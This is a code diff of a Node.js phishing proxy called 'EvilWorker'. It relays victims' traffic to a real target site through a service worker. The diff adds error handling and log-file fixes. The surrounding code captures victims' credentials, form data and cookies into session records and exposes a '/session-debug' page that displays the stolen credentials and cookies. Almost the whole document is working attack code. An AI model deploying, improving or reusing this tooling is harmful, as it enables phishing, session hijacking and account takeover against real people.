@@ -220,332 +220,102 @@ function isLoginFormSubmission(proxyRequestBody, proxyRequestOptions) {
 
 
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
-    const { method, url, headers } = clientRequest;
-    const currentSession = getUserSession(headers.cookie);
-    
-    // Debug logging for Render
-    console.log(`[${new Date().toISOString()}] ${method} ${url} - Session: ${currentSession || 'none'}`);
+    try {
+        const { method, url, headers } = clientRequest;
+        const currentSession = getUserSession(headers.cookie);
+        
+        // Debug logging for Render
+        console.log(`[${new Date().toISOString()}] ${method} ${url} - Session: ${currentSession || 'none'}`);
 
-    // Health check endpoint for Render
-    if (url === "/" || url === "/health") {
-        clientResponse.writeHead(200, { "Content-Type": "application/json" });
-        clientResponse.end(JSON.stringify({ 
-            status: "healthy", 
-            service: "EvilWorker", 
-            timestamp: new Date().toISOString(),
-            uptime: process.uptime()
-        }));
-        return;
-    }
+        // Health check endpoint for Render
+        if (url === "/" || url === "/health") {
+            clientResponse.writeHead(200, { "Content-Type": "application/json" });
+            clientResponse.end(JSON.stringify({ 
+                status: "healthy", 
+                service: "EvilWorker", 
+                timestamp: new Date().toISOString(),
+                uptime: process.uptime()
+            }));
+            return;
+        }
 
-    // Debug endpoint to check request details
-    if (url === "/debug") {
-        clientResponse.writeHead(200, { "Content-Type": "application/json" });
-        clientResponse.end(JSON.stringify({ 
-            url: url,
-            method: method,
-            headers: headers,
-            currentSession: currentSession,
-            hasRequestBody: !!clientRequestBody,
-            PROXY_ENTRY_POINT: PROXY_ENTRY_POINT,
-            PHISHED_URL_PARAMETER: PHISHED_URL_PARAMETER,
-            startsWithEntryPoint: url.startsWith(PROXY_ENTRY_POINT),
-            includesParameter: url.includes(PHISHED_URL_PARAMETER)
-        }));
-        return;
-    }
+        // Debug endpoint to check request details
+        if (url === "/debug") {
+            clientResponse.writeHead(200, { "Content-Type": "application/json" });
+            clientResponse.end(JSON.stringify({ 
+                url: url,
+                method: method,
+                headers: headers,
+                currentSession: currentSession,
+                hasRequestBody: !!clientRequestBody,
+                PROXY_ENTRY_POINT: PROXY_ENTRY_POINT,
+                PHISHED_URL_PARAMETER: PHISHED_URL_PARAMETER,
+                startsWithEntryPoint: url.startsWith(PROXY_ENTRY_POINT),
+                includesParameter: url.includes(PHISHED_URL_PARAMETER)
+            }));
+            return;
+        }
 
-    // Session debug endpoint to see captured data
-    if (url === "/session-debug") {
-        if (!currentSession) {
+        // Session debug endpoint to see captured data
+        if (url === "/session-debug") {
+            if (!currentSession) {
+                clientResponse.writeHead(200, { "Content-Type": "text/html" });
+                clientResponse.end(`
+                    <html>
+                    <head><title>EvilWorker - No Active Session</title></head>
+                    <body>
+                        <h1>No Active Session</h1>
+                        <p>No active session found. Please visit a phishing link first.</p>
+                        <p><a href="/">Back to Home</a></p>
+                    </body>
+                    </html>
+                `);
+                return;
+            }
+            
+            const session = VICTIM_SESSIONS[currentSession];
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
             clientResponse.end(`
                 <html>
-                <head><title>EvilWorker - No Active Session</title></head>
+                <head><title>EvilWorker - Session Data</title></head>
                 <body>
-                    <h1>No Active Session</h1>
-                    <p>No active session found. Please visit a phishing link first.</p>
+                    <h1>Session Data for: ${currentSession}</h1>
+                    <h2>Target Service</h2>
+                    <p><strong>URL:</strong> ${session.targetService?.protocol}//${session.targetService?.host}${session.targetService?.path}</p>
+                    <p><strong>Created:</strong> ${session.createdAt}</p>
+                    <p><strong>Requests:</strong> ${session.requestCount}</p>
+                    
+                    <h2>Captured Credentials</h2>
+                    <p><strong>Total:</strong> ${session.capturedCredentials?.length || 0}</p>
+                    ${session.capturedCredentials?.map(cred => `
+                        <div style="border: 1px solid #ccc; margin: 10px; padding: 10px;">
+                            <p><strong>Time:</strong> ${cred.timestamp}</p>
+                            <p><strong>Path:</strong> ${cred.path}</p>
+                            <p><strong>Credential Fields:</strong> ${JSON.stringify(cred.credentialFields, null, 2)}</p>
+                            <p><strong>All Fields:</strong> ${JSON.stringify(cred.allFields, null, 2)}</p>
+                        </div>
+                    `).join('') || '<p>No credentials captured yet.</p>'}
+                    
+                    <h2>All Cookies (${session.cookies?.length || 0})</h2>
+                    ${session.cookies?.map(cookie => `
+                        <div style="border: 1px solid #ccc; margin: 5px; padding: 5px;">
+                            <p><strong>Name:</strong> ${cookie.name}</p>
+                            <p><strong>Value:</strong> ${cookie.value.substring(0, 100)}${cookie.value.length > 100 ? '...' : ''}</p>
+                            <p><strong>Domain:</strong> ${cookie.domain}</p>
+                            <p><strong>Path:</strong> ${cookie.path}</p>
+                        </div>
+                    `).join('') || '<p>No cookies captured yet.</p>'}
+                    
+                    <h2>Last Form Data</h2>
+                    <pre>${JSON.stringify(session.lastFormData, null, 2) || 'No form data captured yet.'}</pre>
+                    
                     <p><a href="/">Back to Home</a></p>
                 </body>
                 </html>
             `);
             return;
         }
-        
-        const session = VICTIM_SESSIONS[currentSession];
-        clientResponse.writeHead(200, { "Content-Type": "text/html" });
-        clientResponse.end(`
-            <html>
-            <head><title>EvilWorker - Session Data</title></head>
-            <body>
-                <h1>Session Data for: ${currentSession}</h1>
-                <h2>Target Service</h2>
-                <p><strong>URL:</strong> ${session.targetService?.protocol}//${session.targetService?.host}${session.targetService?.path}</p>
-                <p><strong>Created:</strong> ${session.createdAt}</p>
-                <p><strong>Requests:</strong> ${session.requestCount}</p>
-                
-                <h2>Captured Credentials</h2>
-                <p><strong>Total:</strong> ${session.capturedCredentials?.length || 0}</p>
-                ${session.capturedCredentials?.map(cred => `
-                    <div style="border: 1px solid #ccc; margin: 10px; padding: 10px;">
-                        <p><strong>Time:</strong> ${cred.timestamp}</p>
-                        <p><strong>Path:</strong> ${cred.path}</p>
-                        <p><strong>Credential Fields:</strong> ${JSON.stringify(cred.credentialFields, null, 2)}</p>
-                        <p><strong>All Fields:</strong> ${JSON.stringify(cred.allFields, null, 2)}</p>
-                    </div>
-                `).join('') || '<p>No credentials captured yet.</p>'}
-                
-                <h2>All Cookies (${session.cookies?.length || 0})</h2>
-                ${session.cookies?.map(cookie => `
-                    <div style="border: 1px solid #ccc; margin: 5px; padding: 5px;">
-                        <p><strong>Name:</strong> ${cookie.name}</p>
-                        <p><strong>Value:</strong> ${cookie.value.substring(0, 100)}${cookie.value.length > 100 ? '...' : ''}</p>
-                        <p><strong>Domain:</strong> ${cookie.domain}</p>
-                        <p><strong>Path:</strong> ${cookie.path}</p>
-                    </div>
-                `).join('') || '<p>No cookies captured yet.</p>'}
-                
-                <h2>Last Form Data</h2>
-                <pre>${JSON.stringify(session.lastFormData, null, 2) || 'No form data captured yet.'}</pre>
-                
-                <p><a href="/">Back to Home</a></p>
-            </body>
-            </html>
-        `);
-        return;
-    }
 
-    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
-        try {
-            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
-            const { cookieName, cookieValue } = generateNewSession(phishedURL);
-            clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
-            
-            VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
-            VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
-            VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
-            VICTIM_SESSIONS[cookieName].port = phishedURL.port;
-            VICTIM_SESSIONS[cookieName].host = phishedURL.host;
-
-            clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
-            return;
-        }
-        catch (error) {
-            displayError("Phishing URL parsing failed", error, url);
-            clientResponse.writeHead(404, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-            return;
-        }
-    }
-    else if (currentSession || url === PROXY_PATHNAMES.proxy) {
-        if (url === PROXY_PATHNAMES.serviceWorker) {
-            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
-            fs.createReadStream(url.slice(1)).pipe(clientResponse);
-        }
-        else if (url === PROXY_PATHNAMES.favicon) {
-            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
-            clientResponse.end();
-        }
-
-        else {
-            let clientRequestBody = [];
-            clientRequest
-                .on("error", (error) => {
-                    displayError("Client request body retrieval failed", error, method, url);
-                })
-                .on("data", (chunk) => {
-                    clientRequestBody.push(chunk);
-                })
-                .on("end", () => {
-                    clientRequestBody = Buffer.concat(clientRequestBody).toString();
-
-                    if (!currentSession ) {
-                        if (clientRequestBody) {
-                            try {
-                                clientRequestBody = JSON.parse(clientRequestBody);
-                                const proxyRequestURL = new URL(clientRequestBody.url);
-                                const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
-
-                                if (proxyRequestURL.hostname === headers.host &&
-                                    proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
-                                    try {
-                                        const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
-
-                                        const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                                        clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
-
-                                        VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
-                                        VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
-                                        VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
-                                        VICTIM_SESSIONS[cookieName].port = phishedURL.port;
-                                        VICTIM_SESSIONS[cookieName].host = phishedURL.host;
-
-                                        clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
-                                        clientResponse.end();
-                                    }
-                                    catch (error) {
-                                        displayError("Phishing URL parsing failed", error, proxyRequestPath);
-                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
-                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-                                    }
-                                } else {
-                                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
-                                    clientResponse.end();
-                                }
-                            } catch (error) {
-                                displayError("Anonymous client request body parsing failed", error, clientRequestBody);
-                            }
-                        } else {
-                            clientResponse.writeHead(301, { Location: REDIRECT_URL });
-                            clientResponse.end();
-                        }
-                    }
-
-                    else {
-                        let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
-                        const proxyRequestOptions = {
-                            hostname: VICTIM_SESSIONS[currentSession].hostname,
-                            port: VICTIM_SESSIONS[currentSession].port,
-                            method: method,
-                            path: VICTIM_SESSIONS[currentSession].path,
-                            headers: { ...headers },
-                            rejectUnauthorized: false
-                        };
-                        let isNavigationRequest = false;
-
-                        if (clientRequestBody) {
-                            if (url === PROXY_PATHNAMES.jsCookie) {
-                                updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
-                                // Log all cookies after update
-                                logAllCookies(currentSession);
-                                const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
-
-                                clientResponse.writeHead(200, { "Content-Type": "application/json" });
-                                clientResponse.end(JSON.stringify(validDomains));
-                                return;
-                            }
-
-                            else if (url === PROXY_PATHNAMES.proxy) {
-                                try {
-                                    clientRequestBody = JSON.parse(clientRequestBody);
-                                    let proxyRequestURL = new URL(clientRequestBody.url);
-                                    let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
-
-                                    if (proxyRequestURL.hostname === headers.host) {
-                                        if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
-                                            try {
-                                                const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
-
-                                                VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
-                                                VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
-                                                VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
-                                                VICTIM_SESSIONS[currentSession].port = phishedURL.port;
-                                                VICTIM_SESSIONS[currentSession].host = phishedURL.host;
-
-                                                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
-                                                clientResponse.end();
-                                            }
-                                            catch (error) {
-                                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
-                                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
-                                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-                                            }
-                                            return;
-                                        }
-
-                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
-                                            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
-                                            fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
-                                            return;
-                                        }
-
-                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
-                                            try {
-                                                const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
-                                                proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
-                                                proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
-                                            }
-                                            catch (error) {
-                                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
-                                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
-                                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-                                                return;
-                                            }
-                                        }
-
-                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
-                                            updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
-                                            // Log all cookies after update
-                                            logAllCookies(currentSession);
-                                            const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
-
-                                            clientResponse.writeHead(200, { "Content-Type": "application/json" });
-                                            clientResponse.end(JSON.stringify(validDomains));
-                                            return;
-                                        }
-                                    }
-                                    proxyRequestProtocol = proxyRequestURL.protocol;
-                                    proxyRequestOptions.path = proxyRequestPath;
-                                    proxyRequestOptions.port = proxyRequestURL.port;
-                                    proxyRequestOptions.method = clientRequestBody.method;
-
-                                    proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
-                                    if (proxyRequestURL.hostname !== headers.host) {
-                                        proxyRequestOptions.hostname = proxyRequestURL.hostname;
-                                        proxyRequestOptions.headers.host = proxyRequestURL.host;
-                                    }
-                                    if (proxyRequestOptions.headers.referer) {
-                                        proxyRequestOptions.headers.referer = clientRequestBody.referrer;
-                                    }
-                                    isNavigationRequest = clientRequestBody.mode === "navigate";
-                                }
-                                catch (error) {
-                                    displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
-                                }
-                            } else {
-                                console.warn(`/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`);
-                            }
-                        } else {
-                            console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
-                        }
-
-                        proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
-                        updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
-
-                        const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
-                        
-                        // Enhanced data capture - extract and log all form data
-                        if (proxyRequestBody) {
-                            extractAndLogFormData(proxyRequestBody, currentSession, proxyRequestOptions.path);
-                            VICTIM_SESSIONS[currentSession].requestCount++;
-                        }
-                        
-                        const requestContentLength = Buffer.byteLength(proxyRequestBody);
-                        if (requestContentLength) {
-                            proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
-                        }
-                        else {
-                            delete proxyRequestOptions.headers["content-type"];
-                            delete proxyRequestOptions.headers["content-length"];
-                        }
-
-                        if (isNavigationRequest) {
-                            VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
-                            VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
-                            VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
-                            VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
-                            VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
-                        }
-
-                        makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest);
-                    }
-                });
-        }
-    }
-
-    else {
-        // Handle direct browser requests to phishing endpoint without request body
         if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
             try {
                 const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
@@ -560,19 +330,252 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
                 clientResponse.writeHead(200, { "Content-Type": "text/html" });
                 fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
+                return;
             }
             catch (error) {
                 displayError("Phishing URL parsing failed", error, url);
                 clientResponse.writeHead(404, { "Content-Type": "text/html" });
                 fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+                return;
             }
-        } else {
-            clientResponse.writeHead(301, { Location: REDIRECT_URL });
-            clientResponse.end();
         }
+        else if (currentSession || url === PROXY_PATHNAMES.proxy) {
+            if (url === PROXY_PATHNAMES.serviceWorker) {
+                clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
+                fs.createReadStream(url.slice(1)).pipe(clientResponse);
+            }
+            else if (url === PROXY_PATHNAMES.favicon) {
+                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
+                clientResponse.end();
+            }
+
+            else {
+                let clientRequestBody = [];
+                clientRequest
+                    .on("error", (error) => {
+                        displayError("Client request body retrieval failed", error, method, url);
+                    })
+                    .on("data", (chunk) => {
+                        clientRequestBody.push(chunk);
+                    })
+                    .on("end", () => {
+                        clientRequestBody = Buffer.concat(clientRequestBody).toString();
+
+                        if (!currentSession ) {
+                            if (clientRequestBody) {
+                                try {
+                                    clientRequestBody = JSON.parse(clientRequestBody);
+                                    const proxyRequestURL = new URL(clientRequestBody.url);
+                                    const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
+
+                                    if (proxyRequestURL.hostname === headers.host &&
+                                        proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
+                                        try {
+                                            const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
+
+                                            const { cookieName, cookieValue } = generateNewSession(phishedURL);
+                                            clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+
+                                            VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
+                                            VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
+                                            VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
+                                            VICTIM_SESSIONS[cookieName].port = phishedURL.port;
+                                            VICTIM_SESSIONS[cookieName].host = phishedURL.host;
+
+                                            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
+                                            clientResponse.end();
+                                        }
+                                        catch (error) {
+                                            displayError("Phishing URL parsing failed", error, proxyRequestPath);
+                                            clientResponse.writeHead(404, { "Content-Type": "text/html" });
+                                            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+                                        }
+                                    } else {
+                                        clientResponse.writeHead(301, { Location: REDIRECT_URL });
+                                        clientResponse.end();
+                                    }
+                                } catch (error) {
+                                    displayError("Anonymous client request body parsing failed", error, clientRequestBody);
+                                }
+                            } else {
+                                clientResponse.writeHead(301, { Location: REDIRECT_URL });
+                                clientResponse.end();
+                            }
+                        }
+
+                        else {
+                            let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
+                            const proxyRequestOptions = {
+                                hostname: VICTIM_SESSIONS[currentSession].hostname,
+                                port: VICTIM_SESSIONS[currentSession].port,
+                                method: method,
+                                path: VICTIM_SESSIONS[currentSession].path,
+                                headers: { ...headers },
+                                rejectUnauthorized: false
+                            };
+                            let isNavigationRequest = false;
+
+                            if (clientRequestBody) {
+                                if (url === PROXY_PATHNAMES.jsCookie) {
+                                    updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
+                                    // Log all cookies after update
+                                    logAllCookies(currentSession);
+                                    const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
+
+                                    clientResponse.writeHead(200, { "Content-Type": "application/json" });
+                                    clientResponse.end(JSON.stringify(validDomains));
+                                    return;
+                                }
+
+                                else if (url === PROXY_PATHNAMES.proxy) {
+                                    try {
+                                        clientRequestBody = JSON.parse(clientRequestBody);
+                                        let proxyRequestURL = new URL(clientRequestBody.url);
+                                        let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
+
+                                        if (proxyRequestURL.hostname === headers.host) {
+                                            if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
+                                                try {
+                                                    const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
+
+                                                    VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
+                                                    VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
+                                                    VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
+                                                    VICTIM_SESSIONS[currentSession].port = phishedURL.port;
+                                                    VICTIM_SESSIONS[currentSession].host = phishedURL.host;
+
+                                                    clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
+                                                    clientResponse.end();
+                                                }
+                                                catch (error) {
+                                                    displayError("Phishing URL parsing failed", error, proxyRequestPath);
+                                                    clientResponse.writeHead(404, { "Content-Type": "text/html" });
+                                                    fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+                                                }
+                                                return;
+                                            }
+
+                                            else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
+                                                clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
+                                                fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
+                                                return;
+                                            }
+
+                                            else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
+                                                try {
+                                                    const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
+                                                    proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
+                                                    proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
+                                                }
+                                                catch (error) {
+                                                    displayError("Phishing URL parsing failed", error, proxyRequestPath);
+                                                    clientResponse.writeHead(404, { "Content-Type": "text/html" });
+                                                    fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+                                                    return;
+                                                }
+                                            }
+
+                                            else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
+                                                updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
+                                                // Log all cookies after update
+                                                logAllCookies(currentSession);
+                                                const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
+
+                                                clientResponse.writeHead(200, { "Content-Type": "application/json" });
+                                                clientResponse.end(JSON.stringify(validDomains));
+                                                return;
+                                            }
+                                        }
+                                        proxyRequestProtocol = proxyRequestURL.protocol;
+                                        proxyRequestOptions.path = proxyRequestPath;
+                                        proxyRequestOptions.port = proxyRequestURL.port;
+                                        proxyRequestOptions.method = clientRequestBody.method;
+
+                                        proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
+                                        if (proxyRequestURL.hostname !== headers.host) {
+                                            proxyRequestOptions.hostname = proxyRequestURL.hostname;
+                                            proxyRequestOptions.headers.host = proxyRequestURL.host;
+                                        }
+                                        if (proxyRequestOptions.headers.referer) {
+                                            proxyRequestOptions.headers.referer = clientRequestBody.referrer;
+                                        }
+                                        isNavigationRequest = clientRequestBody.mode === "navigate";
+                                    }
+                                    catch (error) {
+                                        displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
+                                    }
+                                } else {
+                                    console.warn(`/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`);
+                                }
+                            } else {
+                                console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
+                            }
+
+                            proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
+                            updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
+
+                            const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
+                            
+                            // Enhanced data capture - extract and log all form data
+                            if (proxyRequestBody) {
+                                extractAndLogFormData(proxyRequestBody, currentSession, proxyRequestOptions.path);
+                                VICTIM_SESSIONS[currentSession].requestCount++;
+                            }
+                            
+                            const requestContentLength = Buffer.byteLength(proxyRequestBody);
+                            if (requestContentLength) {
+                                proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
+                            }
+                            else {
+                                delete proxyRequestOptions.headers["content-type"];
+                                delete proxyRequestOptions.headers["content-length"];
+                            }
+
+                            if (isNavigationRequest) {
+                                VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
+                                VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
+                                VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
+                                VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
+                                VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
+                            }
+
+                            makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest);
+                        });
+                    }
+                }
+
+        } else {
+            // Handle direct browser requests to phishing endpoint without request body
+            if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+                try {
+                    const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
+                    const { cookieName, cookieValue } = generateNewSession(phishedURL);
+                    clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+                    
+                    VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
+                    VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
+                    VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
+                    VICTIM_SESSIONS[cookieName].port = phishedURL.port;
+                    VICTIM_SESSIONS[cookieName].host = phishedURL.host;
+
+                    clientResponse.writeHead(200, { "Content-Type": "text/html" });
+                    fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
+                }
+                catch (error) {
+                    displayError("Phishing URL parsing failed", error, url);
+                    clientResponse.writeHead(404, { "Content-Type": "text/html" });
+                    fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+                }
+            } else {
+                clientResponse.writeHead(301, { Location: REDIRECT_URL });
+                clientResponse.end();
+            }
+        }
+
+
+    } catch (error) {
+        displayError("Main server request handler failed", error, method, url);
     }
-
-
 });
 
 proxyServer.listen(process.env.PORT ?? 3000);
@@ -762,10 +765,39 @@ function generateRandomString(length) {
 }
 
 function createSessionLogFile(logFilename, currentSession) {
-    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
-    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
-
-    LOG_FILE_STREAMS[currentSession] = logFileStream;
+    try {
+        // Sanitize the filename by replacing invalid characters
+        const sanitizedFilename = logFilename.replace(/[:<>"|?*]/g, '_');
+        const logFilePath = path.join(LOGS_DIRECTORY, sanitizedFilename);
+        
+        // Ensure the directory exists
+        if (!fs.existsSync(LOGS_DIRECTORY)) {
+            fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
+        }
+        
+        const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
+        
+        // Add error handling for the write stream
+        logFileStream.on('error', (error) => {
+            console.error(`[ERROR] Failed to create log file for session ${currentSession}:`, error);
+        });
+        
+        LOG_FILE_STREAMS[currentSession] = logFileStream;
+        console.log(`[LOGGING] Created log file: ${sanitizedFilename}`);
+        
+    } catch (error) {
+        console.error(`[ERROR] Failed to create session log file for ${currentSession}:`, error);
+        // Create a fallback log file with a safe name
+        try {
+            const fallbackFilename = `session_${currentSession}_${Date.now()}.log`;
+            const fallbackPath = path.join(LOGS_DIRECTORY, fallbackFilename);
+            const fallbackStream = fs.createWriteStream(fallbackPath, { flags: "a" });
+            LOG_FILE_STREAMS[currentSession] = fallbackStream;
+            console.log(`[LOGGING] Created fallback log file: ${fallbackFilename}`);
+        } catch (fallbackError) {
+            console.error(`[ERROR] Failed to create fallback log file:`, fallbackError);
+        }
+    }
 }
 
 function generateNewSession(phishedURL) {
@@ -775,7 +807,7 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName] = {};
     VICTIM_SESSIONS[cookieName].value = cookieValue;
     VICTIM_SESSIONS[cookieName].cookies = [];
